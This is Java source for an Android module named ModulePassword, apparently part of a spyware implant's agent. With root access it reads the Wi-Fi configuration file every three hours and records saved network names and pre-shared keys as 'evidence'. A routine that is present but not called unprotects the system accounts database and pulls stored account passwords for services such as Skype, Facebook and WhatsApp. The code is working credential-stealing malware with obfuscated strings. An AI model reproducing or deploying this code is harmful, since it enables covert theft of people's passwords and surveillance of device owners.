package com.android.dvci.module;

import android.database.Cursor;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.db.GenericSqliteHelper;
import com.android.dvci.db.RecordVisitor;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.evidence.Markup;
import com.android.dvci.file.Path;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.WChar;
import com.android.mm.M;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;

public class ModulePassword extends BaseModule {

	private static final String TAG = "ModulePassword"; //$NON-NLS-1$
	private static final int ELEM_DELIMITER = 0xABADC0DE;
	private Markup markupPassword;
	private HashMap<Integer, String> lastPasswords;
	private static HashMap<String, Integer> services = new HashMap<String, Integer>();

	@Override
	protected boolean parse(ConfModule conf) {
		if (Status.self().haveRoot()) {
			services.put(M.e("skype"), 0x02);
			services.put(M.e("facebook"), 0x03);
			services.put(M.e("twitter"), 0x04);
			services.put(M.e("google"), 0x05);
			services.put(M.e("whatsapp"), 0x07);
			services.put(M.e("mail"), 0x09);
			services.put(M.e("linkedin"), 0x0a);
			services.put(M.e("wifi"), 0x0b);

			return true;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (parse), don't have root, bailing out");
			}
			return false;
		}
	}

	@Override
	protected void actualStart() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualStart) ");
		}
		// every three hours, check.
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markupPassword = new Markup(this);
		lastPasswords = markupPassword.unserialize(new HashMap<Integer, String>());
	}

	@Override
	protected void actualGo() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (actualGo) ");
		}

		RecordVisitor passwordVisitor = new RecordVisitor() {
			EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
			boolean needToSerialize = false;

			@Override
			public void close() {
				if (needToSerialize) {
					markupPassword.serialize(lastPasswords);
				}
				evidence.close();
			}

			@Override
			public long cursor(Cursor cursor) {
				int jid = cursor.getInt(0);
				String name = cursor.getString(1);
				String type = cursor.getString(2);
				String password = cursor.getString(3);
				String service = getService(type);

				String value = name + "_" + type + "_" + password;

				if (Cfg.DEBUG) {
					Check.log(TAG + " (dumpPasswordDb): id : " + jid + " name : " + name + " type: " + type + " pw: "
							+ password);
				}

				if (!StringUtils.isEmpty(password)) {

					if (lastPasswords.containsKey(jid) && lastPasswords.get(jid).equals(value)) {
						return jid;
					} else {
						lastPasswords.put(jid, value);
						needToSerialize = true;
					}

					addToEvidence(evidence, name, type, password, service);

				}

				return jid;
			}
		};

		String filename_v4 = M.e("/data/misc/wifi/wpa_supplicant.conf");
		String filename_v2 = M.e("/data/wifi/bcm_supp.conf");
		if (!dumpWifi(filename_v4)) {
			dumpWifi(filename_v2);
		}

		// dumpAccounts(passwordVisitor);

	}

	private boolean dumpWifi(String filename) {

		if (Cfg.DEBUG) {
			File file = new File(filename);
			Check.log(TAG + " (dumpWifi) can read: " + file.canRead());
		}
		ExecuteResult pers = Execute.executeRoot(M.e("cat ") + filename);
		List<String> lines = new ArrayList(Arrays.asList(pers.getStdout().split("\\n")));

		if (lines.isEmpty()) {
			return false;
		}
		String ssid = "";
		String psk = "";
		EvidenceBuilder evidence = new EvidenceBuilder(EvidenceType.PASSWORD);
		try {
			for (String line : lines) {
				if (line.contains(M.e("ssid")) && !line.contains(M.e("scan_ssid"))) {
					ssid = getValue(line);
					if (Cfg.DEBUG) {
						Check.log(TAG + " (dumpWifi) ssid = %s", ssid);
					}
				} else if (line.contains("psk")) {
					psk = getValue(line);
					if (Cfg.DEBUG) {
						Check.log(TAG + " (dumpWifi) psk = %s", psk);
					}
					addToEvidence(evidence, ssid, M.e("SSID"), psk, M.e("Wifi"));
				}
			}
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpWifi) Error: %s", ex);
			}
		} finally {
			evidence.close();
		}
		return true;

	}

	private String getValue(String line) {
		String[] parts = line.split("=");
		if (parts.length == 2) {
			return parts[1];
		}
		return null;
	}

	public static void dumpAccounts(RecordVisitor visitor) {
		// h_0=/data/system/
		// h_1=/data/system/users/0/
		// h_2=accounts.db
		String pathUser = M.e("/data/system/users/0/");
		String pathSystem = M.e("/data/system/");
		String file = M.e("accounts.db");

		String dbFile = "";

		if (!Path.unprotect(pathUser, 3, false)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpAccounts) error: cannot open path");
			}
			return;
		}

		GenericSqliteHelper helper = GenericSqliteHelper.openCopy(pathSystem, file);
		if (helper == null) {
			helper = GenericSqliteHelper.openCopy(pathUser, file);
		}

		if (helper == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpPasswordDb) ERROR: cannot open db");
			}
			return;
		}
		try {
			// h_4=accounts
			String table = M.e("accounts");

			// h_5=_id
			// h_6=name
			// h_7=type
			// h_8=password
			String[] projection = {M.e("_id"), M.e("name"), M.e("type"), M.e("password ")};
			visitor.projection = projection;

			helper.traverseRecords(table, visitor);
		} finally {
			helper.disposeDb();
		}

	}

	public static void dumpAddressBookAccounts() {

	}

	private static String getService(String type) {

		Iterator<String> iter = services.keySet().iterator();
		while (iter.hasNext()) {
			String key = iter.next();
			if (type.contains(key)) {
				return key;
			}
		}
		return M.e("service");

	}

	static int getServiceId(String type) {

		Iterator<String> iter = services.keySet().iterator();
		while (iter.hasNext()) {
			String key = iter.next();
			if (type.contains(key)) {
				return services.get(key);
			}
		}

		return 0;

	}

	@Override
	protected void actualStop() {

	}

	private void addToEvidence(EvidenceBuilder evidence, String name, String type, String password, String service) {
		evidence.write(WChar.getBytes(type, true));
		evidence.write(WChar.getBytes(name, true));
		evidence.write(WChar.getBytes(password, true));
		evidence.write(WChar.getBytes(service, true));
		evidence.write(ByteArray.intToByteArray(ELEM_DELIMITER));
	}

}
